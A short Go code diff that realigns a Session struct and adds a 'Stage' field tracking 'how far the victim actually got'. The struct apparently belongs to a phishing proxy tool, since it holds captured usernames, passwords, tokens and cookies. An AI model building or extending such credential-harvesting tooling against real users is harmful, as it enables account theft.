@@ -7,18 +7,20 @@ import (
 )
 
 type Session struct {
-	Id             string
-	Name           string
-	Username       string
-	Password       string
-	Custom         map[string]string
-	Params         map[string]string
-	BodyTokens     map[string]string
-	HttpTokens     map[string]string
-	CookieTokens   map[string]map[string]*database.CookieToken
-	RedirectURL    string
-	IsDone         bool
-	IsAuthUrl      bool
+	Id           string
+	Name         string
+	Username     string
+	Password     string
+	Custom       map[string]string
+	Params       map[string]string
+	BodyTokens   map[string]string
+	HttpTokens   map[string]string
+	CookieTokens map[string]map[string]*database.CookieToken
+	RedirectURL  string
+	IsDone       bool
+	IsAuthUrl    bool
+	// Stage mirrors database.Session.Stage: how far the victim actually got.
+	Stage          int
 	IsForwarded    bool
 	ProgressIndex  int
 	RedirectCount  int
